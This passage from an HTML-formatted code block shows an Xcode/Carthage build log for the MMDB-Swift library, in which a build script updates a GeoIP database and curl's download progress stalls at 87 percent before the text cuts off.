class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">...</span><br><span class="line">    /bin/sh -c /Users/ainassine/Library/Caches/org.carthage.CarthageKit/DerivedData/9.4.1_9F2000/MMDB-Swift/0.2.8/Build/Intermediates.noindex/ArchiveIntermediates/MMDB-iOS/IntermediateBuildFilesPath/MMDB.build/Release-iphoneos/MMDB-iOS.build/Script-366F5FDD1F05152C00DE3883.sh</span><br><span class="line">Updating GeoIP database.</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0</span><br><span class="line">  0 1704k    0  8067    0     0   4225      0  0:06:53  0:00:01  0:06:52  4225</span><br><span class="line">  1 1704k    1 23907    0     0   7462      0  0:03:53  0:00:03  0:03:50  7463</span><br><span class="line">  1 1704k    1 23907    0     0   5685      0  0:05:07  0:00:04  0:05:03  5686</span><br><span class="line">  2 1704k    2 40291    0     0   8236      0  0:03:31  0:00:04  0:03:27  8236</span><br><span class="line">  4 1704k    4 72867    0     0  12864      0  0:02:15  0:00:05  0:02:10 14045</span><br><span class="line">  4 1704k    4 72867    0     0  10931      0  0:02:39  0:00:06  0:02:33 13619</span><br><span class="line">  6 1704k    6  106k    0     0  14439      0  0:02:00  0:00:07  0:01:53 19594</span><br><span class="line">  8 1704k    8  140k    0     0  15812      0  0:01:50  0:00:09  0:01:41 24562</span><br><span class="line">  8 1704k    8  149k    0     0  14996      0  0:01:56  0:00:10  0:01:46 21185</span><br><span class="line">  9 1704k    9  155k    0     0  15004      0  0:01:56  0:00:10  0:01:46 17451</span><br><span class="line"> 10 1704k   10  176k    0     0  15325      0  0:01:53  0:00:11  0:01:42 21032</span><br><span class="line"> 10 1704k   10  186k    0     0  14929      0  0:01:56  0:00:12  0:01:44 15634</span><br><span class="line"> 12 1704k   12  207k    0     0  15192      0  0:01:54  0:00:13  0:01:41 14048</span><br><span class="line"> 12 1704k   12  210k    0     0  14446      0  0:02:00  0:00:14  0:01:46 13242</span><br><span class="line"> 13 1704k   13  231k    0     0  15133      0  0:01:55  0:00:15  0:01:40 15407</span><br><span class="line"> 14 1704k   14  248k    0     0  14982      0  0:01:56  0:00:16  0:01:40 14199</span><br><span class="line"> 15 1704k   15  269k    0     0  15233      0  0:01:54  0:00:18  0:01:36 15966</span><br><span class="line"> 16 1704k   16  275k    0     0  14758      0  0:01:58  0:00:19  0:01:39 13566</span><br><span class="line"> 16 1704k   16  283k    0     0  14897      0  0:01:57  0:00:19  0:01:38 16363</span><br><span class="line"> 17 1704k   17  290k    0     0  13870      0  0:02:05  0:00:21  0:01:44 10452</span><br><span class="line"> 17 1704k   17  306k    0     0  14378      0  0:02:01  0:00:21  0:01:40 12270</span><br><span class="line"> 19 1704k   19  324k    0     0  14334      0  0:02:01  0:00:23  0:01:38 11114</span><br><span class="line"> 19 1704k   19  336k    0     0  14364      0  0:02:01  0:00:24  0:01:37 12841</span><br><span class="line"> 20 1704k   20  352k    0     0  14509      0  0:02:00  0:00:24  0:01:36 13116</span><br><span class="line"> 20 1704k   20  355k    0     0  14037      0  0:02:04  0:00:25  0:01:39 14838</span><br><span class="line"> 21 1704k   21  367k    0     0  14130      0  0:02:03  0:00:26  0:01:37 13005</span><br><span class="line"> 22 1704k   22  386k    0     0  14216      0  0:02:02  0:00:27  0:01:35 13631</span><br><span class="line"> 22 1704k   22  388k    0     0  13804      0  0:02:06  0:00:28  0:01:38 11019</span><br><span class="line"> 23 1704k   23  404k    0     0  13891      0  0:02:05  0:00:29  0:01:36 10751</span><br><span class="line"> 24 1704k   24  411k    0     0  13801      0  0:02:06  0:00:30  0:01:36 12475</span><br><span class="line"> 24 1704k   24  411k    0     0  13363      0  0:02:10  0:00:31  0:01:39  9164</span><br><span class="line"> 25 1704k   25  431k    0     0  13462      0  0:02:09  0:00:32  0:01:37  9208</span><br><span class="line"> 26 1704k   26  457k    0     0  13902      0  0:02:05  0:00:33  0:01:32 14482</span><br><span class="line"> 28 1704k   28  477k    0     0  14177      0  0:02:03  0:00:34  0:01:29 15993</span><br><span class="line"> 28 1704k   28  477k    0     0  13776      0  0:02:06  0:00:35  0:01:31 13623</span><br><span class="line"> 29 1704k   29  511k    0     0  14225      0  0:02:02  0:00:36  0:01:26 19378</span><br><span class="line"> 30 1704k   30  522k    0     0  14266      0  0:02:02  0:00:37  0:01:25 19864</span><br><span class="line"> 30 1704k   30  523k    0     0  13905      0  0:02:05  0:00:38  0:01:27 13923</span><br><span class="line"> 31 1704k   31  538k    0     0  13798      0  0:02:06  0:00:39  0:01:27 11392</span><br><span class="line"> 31 1704k   31  538k    0     0  13459      0  0:02:09  0:00:40  0:01:29 11390</span><br><span class="line"> 32 1704k   32  553k    0     0  13637      0  0:02:07  0:00:41  0:01:26  9083</span><br><span class="line"> 33 1704k   33  576k    0     0  13836      0  0:02:06  0:00:42  0:01:24 10689</span><br><span class="line"> 34 1704k   34  585k    0     0  13786      0  0:02:06  0:00:43  0:01:23 12854</span><br><span class="line"> 34 1704k   34  594k    0     0  13649      0  0:02:07  0:00:44  0:01:23 12379</span><br><span class="line"> 36 1704k   36  629k    0     0  13965      0  0:02:04  0:00:46  0:01:18 17901</span><br><span class="line"> 37 1704k   37  644k    0     0  14101      0  0:02:03  0:00:46  0:01:17 17771</span><br><span class="line"> 38 1704k   38  653k    0     0  14011      0  0:02:04  0:00:47  0:01:17 15468</span><br><span class="line"> 38 1704k   38  664k    0     0  13922      0  0:02:05  0:00:48  0:01:17 15027</span><br><span class="line"> 40 1704k   40  685k    0     0  14096      0  0:02:03  0:00:49  0:01:14 17903</span><br><span class="line"> 40 1704k   40  687k    0     0  13903      0  0:02:05  0:00:50  0:01:15 13255</span><br><span class="line"> 41 1704k   41  699k    0     0  13687      0  0:02:07  0:00:52  0:01:15 10172</span><br><span class="line"> 41 1704k   41  699k    0     0  13430      0  0:02:09  0:00:53  0:01:16  8478</span><br><span class="line"> 41 1704k   41  715k    0     0  13538      0  0:02:08  0:00:54  0:01:14  9968</span><br><span class="line"> 43 1704k   43  746k    0     0  13869      0  0:02:05  0:00:55  0:01:10 11727</span><br><span class="line"> 44 1704k   44  757k    0     0  13956      0  0:02:05  0:00:55  0:01:10 14498</span><br><span class="line"> 44 1704k   44  760k    0     0  13757      0  0:02:06  0:00:56  0:01:10 14627</span><br><span class="line"> 45 1704k   45  767k    0     0  13617      0  0:02:08  0:00:57  0:01:11 15915</span><br><span class="line"> 45 1704k   45  778k    0     0  13601      0  0:02:08  0:00:58  0:01:10 14358</span><br><span class="line"> 45 1704k   45  778k    0     0  13372      0  0:02:10  0:00:59  0:01:11  7324</span><br><span class="line"> 46 1704k   46  796k    0     0  13430      0  0:02:09  0:01:00  0:01:09  7783</span><br><span class="line"> 47 1704k   47  805k    0     0  13207      0  0:02:12  0:01:02  0:01:10  7883</span><br><span class="line"> 47 1704k   47  806k    0     0  13210      0  0:02:12  0:01:02  0:01:10  8346</span><br><span class="line"> 47 1704k   47  812k    0     0  13079      0  0:02:13  0:01:03  0:01:10  6938</span><br><span class="line"> 48 1704k   48  822k    0     0  13012      0  0:02:14  0:01:04  0:01:10  8789</span><br><span class="line"> 49 1704k   49  838k    0     0  13109      0  0:02:13  0:01:05  0:01:08  9031</span><br><span class="line"> 49 1704k   49  841k    0     0  12815      0  0:02:16  0:01:07  0:01:09  7745</span><br><span class="line"> 50 1704k   50  857k    0     0  12905      0  0:02:15  0:01:08  0:01:07  9460</span><br><span class="line"> 50 1704k   50  861k    0     0  12771      0  0:02:16  0:01:09  0:01:07  9202</span><br><span class="line"> 50 1704k   50  867k    0     0  12747      0  0:02:16  0:01:09  0:01:07  9286</span><br><span class="line"> 52 1704k   52  886k    0     0  12772      0  0:02:16  0:01:11  0:01:05  8799</span><br><span class="line"> 52 1704k   52  888k    0     0  12588      0  0:02:18  0:01:12  0:01:06  9524</span><br><span class="line"> 52 1704k   52  892k    0     0  12589      0  0:02:18  0:01:12  0:01:06  7844</span><br><span class="line"> 52 1704k   52  892k    0     0  12418      0  0:02:20  0:01:13  0:01:07  7015</span><br><span class="line"> 52 1704k   52  900k    0     0  12383      0  0:02:20  0:01:14  0:01:06  7143</span><br><span class="line"> 53 1704k   53  914k    0     0  12382      0  0:02:20  0:01:15  0:01:05  6308</span><br><span class="line"> 54 1704k   54  926k    0     0  12313      0  0:02:21  0:01:17  0:01:04  8149</span><br><span class="line"> 54 1704k   54  937k    0     0  12382      0  0:02:20  0:01:17  0:01:03  9326</span><br><span class="line"> 55 1704k   55  938k    0     0  12227      0  0:02:22  0:01:18  0:01:04  9430</span><br><span class="line"> 55 1704k   55  948k    0     0  12210      0  0:02:22  0:01:19  0:01:03  9668</span><br><span class="line"> 56 1704k   56  965k    0     0  12219      0  0:02:22  0:01:20  0:01:02  9878</span><br><span class="line"> 57 1704k   57  973k    0     0  12137      0  0:02:23  0:01:22  0:01:01  9512</span><br><span class="line"> 57 1704k   57  983k    0     0  12199      0  0:02:23  0:01:22  0:01:01  9398</span><br><span class="line"> 58 1704k   58  997k    0     0  12227      0  0:02:22  0:01:23  0:00:59 12242</span><br><span class="line"> 59 1704k   59 1006k    0     0  12192      0  0:02:23  0:01:24  0:00:59 11900</span><br><span class="line"> 59 1704k   59 1013k    0     0  12114      0  0:02:24  0:01:25  0:00:59 10326</span><br><span class="line"> 60 1704k   60 1034k    0     0  12208      0  0:02:22  0:01:26  0:00:56 13463</span><br><span class="line"> 61 1704k   61 1042k    0     0  12107      0  0:02:24  0:01:28  0:00:56 10757</span><br><span class="line"> 62 1704k   62 1056k    0     0  12155      0  0:02:23  0:01:29  0:00:54 11048</span><br><span class="line"> 62 1704k   62 1056k    0     0  12019      0  0:02:25  0:01:30  0:00:55  9379</span><br><span class="line"> 62 1704k   62 1056k    0     0  11887      0  0:02:26  0:01:31  0:00:55  8274</span><br><span class="line"> 63 1704k   63 1078k    0     0  12017      0  0:02:25  0:01:31  0:00:54  8768</span><br><span class="line"> 63 1704k   63 1078k    0     0  11887      0  0:02:26  0:01:32  0:00:54  7725</span><br><span class="line"> 63 1704k   63 1078k    0     0  11760      0  0:02:28  0:01:33  0:00:55  4472</span><br><span class="line"> 65 1704k   65 1108k    0     0  11975      0  0:02:25  0:01:34  0:00:51 11139</span><br><span class="line"> 65 1704k   65 1121k    0     0  12021      0  0:02:25  0:01:35  0:00:50 14729</span><br><span class="line"> 65 1704k   65 1121k    0     0  11896      0  0:02:26  0:01:36  0:00:50  9526</span><br><span class="line"> 65 1704k   65 1121k    0     0  11774      0  0:02:28  0:01:37  0:00:51  9532</span><br><span class="line"> 67 1704k   67 1142k    0     0  11867      0  0:02:27  0:01:38  0:00:49 14007</span><br><span class="line"> 67 1704k   67 1144k    0     0  11745      0  0:02:28  0:01:39  0:00:49  7312</span><br><span class="line"> 67 1704k   67 1151k    0     0  11686      0  0:02:29  0:01:40  0:00:49  5684</span><br><span class="line"> 67 1704k   67 1151k    0     0  11571      0  0:02:30  0:01:41  0:00:49  5681</span><br><span class="line"> 67 1704k   67 1158k    0     0  11466      0  0:02:32  0:01:43  0:00:49  6367</span><br><span class="line"> 68 1704k   68 1166k    0     0  11505      0  0:02:31  0:01:43  0:00:48  4675</span><br><span class="line"> 68 1704k   68 1173k    0     0  11475      0  0:02:32  0:01:44  0:00:48  6077</span><br><span class="line"> 69 1704k   69 1180k    0     0  11418      0  0:02:32  0:01:45  0:00:47  6026</span><br><span class="line"> 69 1704k   69 1180k    0     0  11311      0  0:02:34  0:01:46  0:00:48  6025</span><br><span class="line"> 69 1704k   69 1190k    0     0  11326      0  0:02:34  0:01:47  0:00:47  7866</span><br><span class="line"> 69 1704k   69 1190k    0     0  11221      0  0:02:35  0:01:48  0:00:47  5096</span><br><span class="line"> 70 1704k   70 1208k    0     0  11242      0  0:02:35  0:01:50  0:00:45  6693</span><br><span class="line"> 70 1704k   70 1210k    0     0  11212      0  0:02:35  0:01:50  0:00:45  6515</span><br><span class="line"> 71 1704k   71 1221k    0     0  11139      0  0:02:36  0:01:52  0:00:44  7746</span><br><span class="line"> 71 1704k   71 1225k    0     0  11156      0  0:02:36  0:01:52  0:00:44  7401</span><br><span class="line"> 71 1704k   71 1227k    0     0  11039      0  0:02:38  0:01:53  0:00:45  7216</span><br><span class="line"> 72 1704k   72 1232k    0     0  10978      0  0:02:39  0:01:54  0:00:45  5018</span><br><span class="line"> 73 1704k   73 1256k    0     0  11064      0  0:02:37  0:01:56  0:00:41  8225</span><br><span class="line"> 73 1704k   73 1259k    0     0  11060      0  0:02:37  0:01:56  0:00:41  8995</span><br><span class="line"> 74 1704k   74 1267k    0     0  11047      0  0:02:38  0:01:57  0:00:41  8598</span><br><span class="line"> 74 1704k   74 1269k    0     0  10952      0  0:02:39  0:01:58  0:00:41  8912</span><br><span class="line"> 75 1704k   75 1281k    0     0  10982      0  0:02:38  0:01:59  0:00:39 11096</span><br><span class="line"> 75 1704k   75 1284k    0     0  10885      0  0:02:40  0:02:00  0:00:40  6321</span><br><span class="line"> 75 1704k   75 1287k    0     0  10844      0  0:02:40  0:02:01  0:00:39  5784</span><br><span class="line"> 75 1704k   75 1288k    0     0  10755      0  0:02:42  0:02:02  0:00:40  4153</span><br><span class="line"> 75 1704k   75 1288k    0     0  10667      0  0:02:43  0:02:03  0:00:40  3986</span><br><span class="line"> 76 1704k   76 1311k    0     0  10751      0  0:02:42  0:02:04  0:00:38  5615</span><br><span class="line"> 77 1704k   77 1318k    0     0  10678      0  0:02:43  0:02:06  0:00:37  6191</span><br><span class="line"> 77 1704k   77 1318k    0     0  10594      0  0:02:44  0:02:07  0:00:37  5403</span><br><span class="line"> 77 1704k   77 1319k    0     0  10557      0  0:02:45  0:02:08  0:00:37  5986</span><br><span class="line"> 78 1704k   78 1333k    0     0  10632      0  0:02:44  0:02:08  0:00:36  9719</span><br><span class="line"> 78 1704k   78 1336k    0     0  10546      0  0:02:45  0:02:09  0:00:36  5308</span><br><span class="line"> 78 1704k   78 1342k    0     0  10461      0  0:02:46  0:02:11  0:00:35  4937</span><br><span class="line"> 79 1704k   79 1349k    0     0  10503      0  0:02:46  0:02:11  0:00:35  7687</span><br><span class="line"> 79 1704k   79 1349k    0     0  10423      0  0:02:47  0:02:12  0:00:35  6643</span><br><span class="line"> 79 1704k   79 1356k    0     0  10361      0  0:02:48  0:02:14  0:00:34  4121</span><br><span class="line"> 79 1704k   79 1356k    0     0  10284      0  0:02:49  0:02:15  0:00:34  3824</span><br><span class="line"> 79 1704k   79 1362k    0     0  10253      0  0:02:50  0:02:16  0:00:34  4349</span><br><span class="line"> 80 1704k   80 1370k    0     0  10230      0  0:02:50  0:02:17  0:00:33  3842</span><br><span class="line"> 81 1704k   81 1381k    0     0  10282      0  0:02:49  0:02:17  0:00:32  6577</span><br><span class="line"> 81 1704k   81 1388k    0     0  10203      0  0:02:51  0:02:19  0:00:32  6230</span><br><span class="line"> 81 1704k   81 1388k    0     0  10130      0  0:02:52  0:02:20  0:00:32  6225</span><br><span class="line"> 81 1704k   81 1397k    0     0  10133      0  0:02:52  0:02:21  0:00:31  6982</span><br><span class="line"> 82 1704k   82 1400k    0     0  10082      0  0:02:53  0:02:22  0:00:31  6039</span><br><span class="line"> 82 1704k   82 1404k    0     0  10093      0  0:02:52  0:02:22  0:00:30  4736</span><br><span class="line"> 83 1704k   83 1419k    0     0  10124      0  0:02:52  0:02:23  0:00:29  7503</span><br><span class="line"> 83 1704k   83 1419k    0     0  10053      0  0:02:53  0:02:24  0:00:29  7507</span><br><span class="line"> 83 1704k   83 1419k    0     0   9984      0  0:02:54  0:02:25  0:00:29  5212</span><br><span class="line"> 84 1704k   84 1436k    0     0   9985      0  0:02:54  0:02:27  0:00:27  7295</span><br><span class="line"> 84 1704k   84 1445k    0     0  10023      0  0:02:54  0:02:27  0:00:27  8088</span><br><span class="line"> 84 1704k   84 1445k    0     0   9955      0  0:02:55  0:02:28  0:00:27  5146</span><br><span class="line"> 85 1704k   85 1456k    0     0   9952      0  0:02:55  0:02:29  0:00:26  7150</span><br><span class="line"> 85 1704k   85 1463k    0     0   9902      0  0:02:56  0:02:31  0:00:25  7821</span><br><span class="line"> 86 1704k   86 1466k    0     0   9907      0  0:02:56  0:02:31  0:00:25  7186</span><br><span class="line"> 86 1704k   86 1470k    0     0   9854      0  0:02:57  0:02:32  0:00:25  5032</span><br><span class="line"> 86 1704k   86 1478k    0     0   9854      0  0:02:57  0:02:33  0:00:24  6866</span><br><span class="line"> 87 1704k   87 1484k    0     0   9835      0  0:02:57  0:02:34  0:00:23  6110</span><br><span class="line"> 87 1704k   87 1488k    0     0   9752      0  0:02:58  0:02:36  0:00:22  5187</span><br><span class="line"> 87 1704k   87 1488k    0     0   9689      0  0:03:00  0:02:37  0:00:23  3984</span><br><span class="line"> 87 1704k   87 1488k    0     0   9628      0  0:03:01  0:02:38  0:00:23  3380</span><br><span class="line"> 87 1704k   87 1488k    0     0   9567      0  0:03:02  0:02:39  0:00:23  1782</span><br><span class="line"> 87 1704k   87 1488k    0     0   9507      0  0:03:03  0:02:40  0:00:23   747</span><br><span class="line"> 87 1704k   87 1488k    0     0   9448      0  0:03:04  0:02:41  0:00:23     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   9390      0  0:03:05  0:02:42  0:00:23     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   9332      0  0:03:07  0:02:43  0:00:24     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   9275      0  0:03:08  0:02:44  0:00:24     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   9219      0  0:03:09  0:02:45  0:00:24     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   9163      0  0:03:10  0:02:46  0:00:24     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   9108      0  0:03:11  0:02:47  0:00:24     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   9054      0  0:03:12  0:02:48  0:00:24     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   9000      0  0:03:13  0:02:49  0:00:24     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8947      0  0:03:15  0:02:50  0:00:25     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8895      0  0:03:16  0:02:51  0:00:25     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8843      0  0:03:17  0:02:52  0:00:25     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8792      0  0:03:18  0:02:53  0:00:25     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8741      0  0:03:19  0:02:54  0:00:25     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8691      0  0:03:20  0:02:55  0:00:25     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8642      0  0:03:21  0:02:56  0:00:25     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8593      0  0:03:23  0:02:57  0:00:26     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8544      0  0:03:24  0:02:58  0:00:26     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8496      0  0:03:25  0:02:59  0:00:26     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8449      0  0:03:26  0:03:00  0:00:26     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8402      0  0:03:27  0:03:01  0:00:26     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8356      0  0:03:28  0:03:02  0:00:26     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8310      0  0:03:30  0:03:03  0:00:27     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8265      0  0:03:31  0:03:04  0:00:27     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8220      0  0:03:32  0:03:05  0:00:27     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8176      0  0:03:33  0:03:06  0:00:27     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8132      0  0:03:34  0:03:07  0:00:27     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8089      0  0:03:35  0:03:08  0:00:27     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8046      0  0:03:36  0:03:09  0:00:27     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   8004      0  0:03:38  0:03:10  0:00:28     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7962      0  0:03:39  0:03:11  0:00:28     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7920      0  0:03:40  0:03:12  0:00:28     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7879      0  0:03:41  0:03:13  0:00:28     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7839      0  0:03:42  0:03:14  0:00:28     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7799      0  0:03:43  0:03:15  0:00:28     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7759      0  0:03:44  0:03:16  0:00:28     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7720      0  0:03:46  0:03:17  0:00:29     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7680      0  0:03:47  0:03:18  0:00:29     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7642      0  0:03:48  0:03:19  0:00:29     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7604      0  0:03:49  0:03:20  0:00:29     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7566      0  0:03:50  0:03:21  0:00:29     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7528      0  0:03:51  0:03:22  0:00:29     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7491      0  0:03:53  0:03:23  0:00:30     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7454      0  0:03:54  0:03:24  0:00:30     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7418      0  0:03:55  0:03:25  0:00:30     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7382      0  0:03:56  0:03:26  0:00:30     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7346      0  0:03:57  0:03:27  0:00:30     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7311      0  0:03:58  0:03:28  0:00:30     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7276      0  0:03:59  0:03:29  0:00:30     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7241      0  0:04:01  0:03:30  0:00:31     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7207      0  0:04:02  0:03:31  0:00:31     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7173      0  0:04:03  0:03:32  0:00:31     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7139      0  0:04:04  0:03:33  0:00:31     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7105      0  0:04:05  0:03:34  0:00:31     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7072      0  0:04:06  0:03:35  0:00:31     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7039      0  0:04:07  0:03:36  0:00:31     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   7007      0  0:04:09  0:03:37  0:00:32     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6975      0  0:04:10  0:03:38  0:00:32     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6943      0  0:04:11  0:03:39  0:00:32     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6911      0  0:04:12  0:03:40  0:00:32     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6880      0  0:04:13  0:03:41  0:00:32     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6849      0  0:04:14  0:03:42  0:00:32     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6818      0  0:04:16  0:03:43  0:00:33     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6788      0  0:04:17  0:03:44  0:00:33     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6758      0  0:04:18  0:03:45  0:00:33     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6728      0  0:04:19  0:03:46  0:00:33     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6698      0  0:04:20  0:03:47  0:00:33     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6669      0  0:04:21  0:03:48  0:00:33     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6639      0  0:04:22  0:03:49  0:00:33     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6611      0  0:04:24  0:03:50  0:00:34     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6582      0  0:04:25  0:03:51  0:00:34     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6554      0  0:04:26  0:03:52  0:00:34     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6525      0  0:04:27  0:03:53  0:00:34     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6497      0  0:04:28  0:03:54  0:00:34     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6470      0  0:04:29  0:03:55  0:00:34     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6442      0  0:04:30  0:03:56  0:00:34     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6415      0  0:04:32  0:03:57  0:00:35     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6388      0  0:04:33  0:03:58  0:00:35     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6361      0  0:04:34  0:03:59  0:00:35     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6335      0  0:04:35  0:04:00  0:00:35     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6309      0  0:04:36  0:04:01  0:00:35     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6283      0  0:04:37  0:04:02  0:00:35     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6257      0  0:04:38  0:04:03  0:00:35     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6231      0  0:04:40  0:04:04  0:00:36     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6206      0  0:04:41  0:04:05  0:00:36     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6180      0  0:04:42  0:04:06  0:00:36     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6155      0  0:04:43  0:04:07  0:00:36     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6131      0  0:04:44  0:04:08  0:00:36     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6106      0  0:04:45  0:04:09  0:00:36     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6082      0  0:04:46  0:04:10  0:00:36     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6057      0  0:04:48  0:04:11  0:00:37     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6033      0  0:04:49  0:04:12  0:00:37     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   6009      0  0:04:50  0:04:13  0:00:37     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5986      0  0:04:51  0:04:14  0:00:37     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5962      0  0:04:52  0:04:15  0:00:37     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5939      0  0:04:53  0:04:16  0:00:37     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5916      0  0:04:55  0:04:17  0:00:38     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5893      0  0:04:56  0:04:18  0:00:38     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5870      0  0:04:57  0:04:19  0:00:38     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5847      0  0:04:58  0:04:20  0:00:38     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5825      0  0:04:59  0:04:21  0:00:38     0</span><br><span class="line"> 87 1704k   87 1488k    0     0   5803      0  0:05:00  0:04:22  0:00:38     